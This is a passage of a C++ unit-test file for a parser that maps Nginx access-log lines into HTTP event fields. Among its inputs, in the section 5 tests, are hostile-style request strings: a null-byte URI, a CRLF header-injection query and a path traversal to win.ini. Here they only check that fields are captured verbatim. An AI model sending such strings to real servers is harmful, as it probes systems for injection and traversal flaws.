  // 5a. Null byte in URI
  {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/files/report.pdf%00.html", "HTTP/1.1", 200, 512, "-",
        "Mozilla/5.0");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_EQ(r->at("request_uri"), "/files/report.pdf%00.html");
  }

  // 5b. CRLF characters in query string
  {
    std::string line = makeNginxLine(
        "10.0.0.2", "-", "20/May/2026:10:01:00 +0800", "GET",
        "/redirect?url=%0d%0aX-Injected:true", "HTTP/1.1", 302, 0, "-",
        "Mozilla/5.0");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_EQ(r->at("request_uri"),
              "/redirect?url=%0d%0aX-Injected:true");
  }

  // 5c. 含双引号的User-Agent (模拟恶意UA)
  {
    // Nginx combined log中UA被双引号包裹，内部的引号通常被转义
    // 这里测试UA中含有括号、分号等特殊字符
    std::string line = makeNginxLine(
        "10.0.0.3", "-", "20/May/2026:10:02:00 +0800", "GET",
        "/api/data", "HTTP/1.1", 200, 256, "-",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    // UA应包含所有括号和分号
    std::string ua = r->at("http_user_agent");
    EXPECT_NE(ua.find("(X11; Linux x86_64)"), std::string::npos);
    EXPECT_NE(ua.find("(KHTML, like Gecko)"), std::string::npos);
  }

  // 5d. 中文referer URL
  {
    std::string line = makeNginxLine(
        "10.0.0.4", "-", "20/May/2026:10:03:00 +0800", "GET",
        "/zh/docs", "HTTP/1.1", 200, 1024,
        "https://www.example.com/搜索?关键词=测试", "Mozilla/5.0");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_EQ(r->at("http_referer"),
              "https://www.example.com/搜索?关键词=测试");
  }

  // 5e. 含 @ # $ % & 的URI
  {
    std::string line = makeNginxLine(
        "10.0.0.5", "-", "20/May/2026:10:04:00 +0800", "GET",
        "/api/search?q=user@example.com&type=pdf#section",
        "HTTP/1.1", 200, 512, "-", "curl/8.0.1");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    std::string uri = r->at("request_uri");
    EXPECT_NE(uri.find("@"), std::string::npos);
    EXPECT_NE(uri.find("#"), std::string::npos);
  }

  // 5f. 反斜杠和点号 (路径相关)
  {
    std::string line = makeNginxLine(
        "10.0.0.6", "-", "20/May/2026:10:05:00 +0800", "GET",
        "/static/..\\..\\windows\\win.ini", "HTTP/1.1", 403, 128, "-",
        "curl/8.0.1");
    auto r = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(r.has_value());
    std::string uri = r->at("request_uri");
    EXPECT_NE(uri.find("\\"), std::string::npos);
    EXPECT_NE(uri.find("..\\"), std::string::npos);
  }
}

// ============================================================================
// 6. NginxRequestVersionStripping — HTTP/1.1 正确strip为 1.1
// ============================================================================

/**
 * @brief 验证正则捕获的请求版本字符串正确包含 HTTP/ 前缀，
 *        并且可以通过 stripHttpPrefix 获得纯版本号。
 *
 * 测试 HTTP/0.9, HTTP/1.0, HTTP/1.1, HTTP/2.0
 */
TEST(NginxInjectionTest, NginxRequestVersionStripping) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  struct VersionCase {
    std::string raw_version;
    std::string expected_stripped;
  };

  std::vector<VersionCase> cases = {
      {"HTTP/0.9", "0.9"},
      {"HTTP/1.0", "1.0"},
      {"HTTP/1.1", "1.1"},
      {"HTTP/2.0", "2.0"},
  };

  for (const auto& tc : cases) {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/test", tc.raw_version, 200, 100, "-", "curl");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value())
        << "Failed for version: " << tc.raw_version;

    std::string captured_version = (*fields)["request_version"];
    EXPECT_EQ(captured_version, tc.raw_version)
        << "Captured version should include HTTP/ prefix";

    std::string stripped = stripHttpPrefix(captured_version);
    EXPECT_EQ(stripped, tc.expected_stripped)
        << "Stripped version mismatch for " << tc.raw_version;
  }

  // 额外测试: 构建HttpAccessEvent并验证request_version字段可正确存储
  {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/test", "HTTP/1.1", 200, 100, "-", "curl");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    HttpAccessEvent event = buildEvent(*fields);
    // request_version 设置为 "HTTP/1.1" (捕获的原始值)
    EXPECT_EQ(event.request_version(), "HTTP/1.1");
  }
}

// ============================================================================
// 7. NginxUserAgentExtraction — User-Agent作为header正确提取
// ============================================================================

/**
 * @brief 验证 http_user_agent 捕获组正确提取，并能作为 request header
 *        写入 HttpAccessEvent。
 *
 * 测试多种常见User-Agent:
 *   - Chrome desktop
 *   - curl
 *   - python-requests
 *   - Mobile Safari
 */
TEST(NginxInjectionTest, NginxUserAgentExtraction) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  struct UaCase {
    std::string user_agent;
    std::string expected_keyword;
  };

  std::vector<UaCase> cases = {
      {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
       "Chrome/125"},
      {"curl/8.0.1", "curl"},
      {"python-requests/2.31.0", "python-requests"},
      {"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
       "AppleWebKit/605.1.15 Mobile/15E148",
       "iPhone"},
      {"kube-probe/1.28", "kube-probe"},
      {"grpc-go/1.60.0", "grpc-go"},
      {"Java/17.0.2", "Java/17"},
      {"sqlmap/1.0-dev", "sqlmap"},
  };

  for (size_t i = 0; i < cases.size(); ++i) {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/api/test", "HTTP/1.1", 200, 512, "-", cases[i].user_agent);

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value())
        << "UA case[" << i << "] extract failed";

    std::string extracted_ua = (*fields)["http_user_agent"];
    EXPECT_EQ(extracted_ua, cases[i].user_agent)
        << "UA case[" << i << "] full UA mismatch";

    EXPECT_NE(extracted_ua.find(cases[i].expected_keyword),
              std::string::npos)
        << "UA case[" << i << "] keyword not found in extracted UA";
  }

  // 端到端: 写入HttpAccessEvent并作为header
  {
    std::string line = makeNginxLine(
        "10.0.0.99", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/api/test", "HTTP/1.1", 200, 512, "-",
        "Mozilla/5.0 (compatible; Googlebot/2.1)");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    std::string ua = (*fields)["http_user_agent"];

    // 构造 HttpAccessEvent 并添加 User-Agent 作为 request header
    HttpAccessEvent event;
    auto* header = event.add_request_headers();
    header->set_key("User-Agent");
    header->set_value(ua);

    EXPECT_EQ(event.request_headers_size(), 1);
    EXPECT_EQ(event.request_headers(0).key(), "User-Agent");
    EXPECT_EQ(event.request_headers(0).value(),
              "Mozilla/5.0 (compatible; Googlebot/2.1)");
  }
}

// ============================================================================
// 8. NginxRefererExtraction — Referer正确提取
// ============================================================================

/**
 * @brief 验证 http_referer 捕获组正确提取各种Referer值：
 *   - 完整URL
 *   - 空Referer ("-")
 *   - HTTPS Referer
 *   - 带query string的Referer
 *   - 跨域Referer
 */
TEST(NginxInjectionTest, NginxRefererExtraction) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  struct RefererCase {
    std::string referer;
    std::string expected_value;
  };

  std::vector<RefererCase> cases = {
      {"-", "-"},
      {"https://www.example.com/", "https://www.example.com/"},
      {"https://example.com/page?q=search", "https://example.com/page?q=search"},
      {"http://internal.corp.local:8080/admin",
       "http://internal.corp.local:8080/admin"},
      {"https://google.com/search?q=nginx+logs",
       "https://google.com/search?q=nginx+logs"},
  };

  for (size_t i = 0; i < cases.size(); ++i) {
    std::string line =
        makeNginxLine("10.0.0.1", "-", "20/May/2026:10:00:00 +0800",
                      "GET", "/page", "HTTP/1.1", 200, 512,
                      cases[i].referer, "Mozilla/5.0");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value())
        << "Referer case[" << i << "] extract failed";

    EXPECT_EQ((*fields)["http_referer"], cases[i].expected_value)
        << "Referer case[" << i << "] value mismatch";
  }

  // 端到端: 写入HttpAccessEvent
  {
    std::string line =
        makeNginxLine("172.16.0.1", "admin",
                      "20/May/2026:10:00:00 +0800", "GET",
                      "/secure/dashboard", "HTTP/1.1", 200, 2048,
                      "https://sso.corp.example.com/login?next=/dashboard",
                      "Mozilla/5.0");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    // 使用 FieldApplier 写入事件
    std::map<std::string, std::string> remapped;
    remapped["http_referer"] = (*fields)["http_referer"];

    std::vector<FieldMapping> ref_mappings;
    {
      FieldMapping fm;
      fm.source = "http_referer";
      fm.target = "http_referer";
      fm.type = FieldType::String;
      ref_mappings.push_back(fm);
    }

    HttpAccessEvent event;
    FieldApplier applier;
    applier.applyFields(remapped, event, ref_mappings);

    // 注意: HttpAccessEvent 没有直接的 referer 字段,
    // 但 http_referer 会被映射到某个 string 字段或作为 header
    // 这里验证提取值正确，实际生产中 Referer 会作为 request header
    EXPECT_EQ((*fields)["http_referer"],
              "https://sso.corp.example.com/login?next=/dashboard");
  }
}

// ============================================================================
// 9. NginxStatusCodesMapping — 各HTTP状态码正确转为int32
// ============================================================================

/**
 * @brief 验证各类HTTP状态码在解析和类型转换后正确。
 *
 * 覆盖范围:
 *   - 1xx: 101 (Switching Protocols), 100 (Continue)
 *   - 2xx: 200, 201, 204, 206
 *   - 3xx: 301, 302, 304
 *   - 4xx: 400, 403, 404, 429
 *   - 5xx: 500, 502, 503
 */
TEST(NginxInjectionTest, NginxStatusCodesMapping) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  struct StatusCase {
    int status_code;
    std::string category;
  };

  std::vector<StatusCase> cases = {
      {100, "1xx Continue"},
      {101, "1xx Switching Protocols"},
      {200, "2xx OK"},
      {201, "2xx Created"},
      {204, "2xx No Content"},
      {206, "2xx Partial Content"},
      {301, "3xx Moved Permanently"},
      {302, "3xx Found"},
      {304, "3xx Not Modified"},
      {400, "4xx Bad Request"},
      {403, "4xx Forbidden"},
      {404, "4xx Not Found"},
      {429, "4xx Too Many Requests"},
      {500, "5xx Internal Server Error"},
      {502, "5xx Bad Gateway"},
      {503, "5xx Service Unavailable"},
  };

  for (const auto& tc : cases) {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/test", "HTTP/1.1", tc.status_code, 512, "-", "curl");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value())
        << "Status " << tc.status_code << " extract failed";

    // 验证捕获的原始字符串
    EXPECT_EQ((*fields)["response_status"],
              std::to_string(tc.status_code))
        << "Status string mismatch for " << tc.category;

    // 验证通过 FieldApplier 转换为 int32
    HttpAccessEvent event = buildEvent(*fields);
    EXPECT_EQ(event.response_status(), tc.status_code)
        << "Status int32 mismatch for " << tc.category;
  }
}

// ============================================================================
// 10. NginxLargeBodySize — body_bytes_sent正确处理大值
// ============================================================================

/**
 * @brief 验证 body_bytes_sent 正确处理各种大小值：
 *   - 0 (空响应)
 *   - 小值 (< 1KB)
 *   - 中值 (KB ~ MB)
 *   - 大值 (接近 2GB)
 *   - int64 边界值
 */
TEST(NginxInjectionTest, NginxLargeBodySize) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  struct BodySizeCase {
    int64_t body_size;
    std::string description;
  };

  std::vector<BodySizeCase> cases = {
      {0, "zero"},
      {128, "small"},
      {4096, "4KB"},
      {1048576, "1MB"},
      {104857600, "100MB"},
      {1073741824, "1GB"},
      {2147483647, "~2GB (int32 max)"},
      {int64_t{1} << 40, "1TB"},  // Nginx 通常不支持这么大，但测试解析
  };

  for (const auto& tc : cases) {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/download/file", "HTTP/1.1", 200, tc.body_size, "-", "curl");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value())
        << "Body size " << tc.description << " extract failed";

    std::string captured = (*fields)["body_bytes_sent"];
    EXPECT_EQ(captured, std::to_string(tc.body_size))
        << "Body size string mismatch for " << tc.description;

    // 验证可以转换为 int64
    int64_t parsed = 0;
    auto [ptr, ec] = std::from_chars(
        captured.data(), captured.data() + captured.size(), parsed);
    EXPECT_EQ(ec, std::errc{})
        << "Body size parse error for " << tc.description;
    EXPECT_EQ(parsed, tc.body_size)
        << "Body size int64 mismatch for " << tc.description;

    // 通过 FieldApplier 写入 HttpAccessEvent
    HttpAccessEvent event = buildEvent(*fields);
    EXPECT_EQ(event.request_body_length(), tc.body_size)
        << "Event body_length mismatch for " << tc.description;
  }
}

// ============================================================================
// 11. NginxEmptyFields — 空字段("-")正确处理
// ============================================================================

/**
 * @brief 验证 Nginx 日志中 "-" 空字段正确处理：
 *   - remote_user = "-"
 *   - http_referer = "-"
 *   - 所有含 "-" 的字段均能正常解析
 *
 * 同时测试当字段为 "-" 时，FieldApplier 使用默认值替换。
 */
TEST(NginxInjectionTest, NginxEmptyFields) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  // 模拟典型的空字段日志: remote_user和referer都为"-"
  {
    std::string line = makeNginxLine(
        "10.0.0.1", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/api/health", "HTTP/1.1", 200, 5, "-", "curl/8.0.1");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    EXPECT_EQ((*fields)["remote_user"], "-");
    EXPECT_EQ((*fields)["http_referer"], "-");
    EXPECT_EQ((*fields)["request_method"], "GET");
    EXPECT_EQ((*fields)["response_status"], "200");
  }

  // 测试: 使用带默认值的FieldMapping
  {
    std::string line = makeNginxLine(
        "10.0.0.2", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/page", "HTTP/1.1", 200, 100, "-", "-");

    auto compile_ret2 = mapper.compile(kNginxPattern);
    ASSERT_TRUE(compile_ret2.has_value());

    std::vector<FieldMapping> mappings_with_defaults;

    // remote_addr 正常
    {
      FieldMapping fm;
      fm.source = "remote_addr";
      fm.target = "downstream_ip";
      fm.type = FieldType::String;
      mappings_with_defaults.push_back(fm);
    }
    // http_referer 带默认值
    {
      FieldMapping fm;
      fm.source = "http_referer";
      fm.target = "http_referer";
      fm.type = FieldType::String;
      fm.default_value = "direct";
      mappings_with_defaults.push_back(fm);
    }
    // http_user_agent 带默认值
    {
      FieldMapping fm;
      fm.source = "http_user_agent";
      fm.target = "http_user_agent";
      fm.type = FieldType::String;
      fm.default_value = "unknown";
      mappings_with_defaults.push_back(fm);
    }
    // remote_user → 空默认为 "anonymous"
    {
      FieldMapping fm;
      fm.source = "remote_user";
      fm.target = "remote_user";
      fm.type = FieldType::String;
      fm.default_value = "anonymous";
      mappings_with_defaults.push_back(fm);
    }

    auto result = mapper.extract(line, kNginxPattern,
                                 mappings_with_defaults);
    ASSERT_TRUE(result.has_value());

    // 由于 http_referer 的值为 "-" (在captured中存在),
    // 实际上 default_value 不会触发 (因为捕获组存在且值为"-")
    // 这里主要验证 "-" 作为合法值被接受
    EXPECT_EQ((*result)["http_referer"], "-");
    EXPECT_EQ((*result)["http_user_agent"], "-");
    EXPECT_EQ((*result)["remote_user"], "-");
  }

  // 测试: upstream_ip 缺失时应使用默认值
  {
    // 构造一个没有对应捕获组的映射来触发默认值
    // 这里使用实际不存在的source来验证default_value机制
    std::string line =
        R"(10.0.0.3 - - [20/May/2026:10:00:00 +0800] "GET / HTTP/1.1" 200 100 "-" "-")";

    std::vector<FieldMapping> mappings;
    FieldMapping fm;
    fm.source = "http_referer";
    fm.target = "http_referer";
    fm.type = FieldType::String;
    fm.default_value = "direct_navigation";
    mappings.push_back(fm);

    auto compile_ret3 = mapper.compile(kNginxPattern);
    ASSERT_TRUE(compile_ret3.has_value());

    auto result = mapper.extract(line, kNginxPattern, mappings);
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ((*result)["http_referer"], "-")
        << "当捕获组值就是'-'时，应返回'-'而非默认值";
  }
}

// ============================================================================
// 12. NginxHttp2Requests — HTTP/2.0 日志正确解析
// ============================================================================

/**
 * @brief 验证 HTTP/2.0 请求的日志行被正确解析。
 *
 * 测试内容:
 *   - HTTP/2.0 版本正确捕获
 *   - Strip 后版本号为 "2.0"
 *   - gRPC over HTTP/2
 *   - HTTP/2 的大body响应
 *   - HTTP/2 的 101 升级
 */
TEST(NginxInjectionTest, NginxHttp2Requests) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  // 12a. 标准 HTTP/2.0 请求
  {
    std::string line = makeNginxLine(
        "10.0.0.10", "-", "20/May/2026:10:00:00 +0800", "GET",
        "/index.html", "HTTP/2.0", 200, 8192, "-",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    EXPECT_EQ((*fields)["request_version"], "HTTP/2.0");
    EXPECT_EQ(stripHttpPrefix((*fields)["request_version"]), "2.0");
    EXPECT_EQ((*fields)["request_method"], "GET");
    EXPECT_EQ((*fields)["response_status"], "200");
  }

  // 12b. gRPC over HTTP/2
  {
    std::string line = makeNginxLine(
        "10.0.0.11", "-", "20/May/2026:10:01:00 +0800", "POST",
        "/package.Service/Method", "HTTP/2.0", 200, 256, "-",
        "grpc-c++/1.60.0");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    EXPECT_EQ((*fields)["request_version"], "HTTP/2.0");
    EXPECT_EQ((*fields)["request_method"], "POST");
    EXPECT_EQ((*fields)["request_uri"], "/package.Service/Method");
  }

  // 12c. HTTP/2.0 大响应
  {
    std::string line = makeNginxLine(
        "10.0.0.12", "-", "20/May/2026:10:02:00 +0800", "GET",
        "/api/stream", "HTTP/2.0", 200, 5242880, "-",
        "Mozilla/5.0 (X11; Linux x86_64)");

    auto fields = extractFields(mapper, line);
    ASSERT_TRUE(fields.has_value());

    int64_t body_bytes = 0;
    auto [ptr, ec] = std::from_chars(
        (*fields)["body_bytes_sent"].data(),
        (*fields)["body_bytes_sent"].data() +
            (*fields)["body_bytes_sent"].size(),
        body_bytes);
    EXPECT_EQ(ec, std::errc{});
    EXPECT_EQ(body_bytes, 5242880);
  }

  // 12d. 验证 HTTP/1.1 和 HTTP/2.0 混合解析
  {
    std::vector<std::string> lines = {
        makeNginxLine("10.0.0.20", "-",
                      "20/May/2026:10:00:00 +0800", "GET", "/a",
                      "HTTP/1.0", 200, 100, "-", "curl"),
        makeNginxLine("10.0.0.20", "-",
                      "20/May/2026:10:00:01 +0800", "GET", "/b",
                      "HTTP/1.1", 200, 100, "-", "curl"),
        makeNginxLine("10.0.0.20", "-",
                      "20/May/2026:10:00:02 +0800", "GET", "/c",
                      "HTTP/2.0", 200, 100, "-", "curl"),
    };

    std::vector<std::string> expected_versions = {
        "HTTP/1.0", "HTTP/1.1", "HTTP/2.0"};
    std::vector<std::string> expected_stripped = {"1.0", "1.1", "2.0"};

    for (size_t i = 0; i < lines.size(); ++i) {
      auto fields = extractFields(mapper, lines[i]);
      ASSERT_TRUE(fields.has_value()) << "Line " << i << " failed";

      EXPECT_EQ((*fields)["request_version"], expected_versions[i])
          << "Version mismatch at line " << i;
      EXPECT_EQ(stripHttpPrefix((*fields)["request_version"]),
                expected_stripped[i])
          << "Stripped version mismatch at line " << i;
    }
  }
}
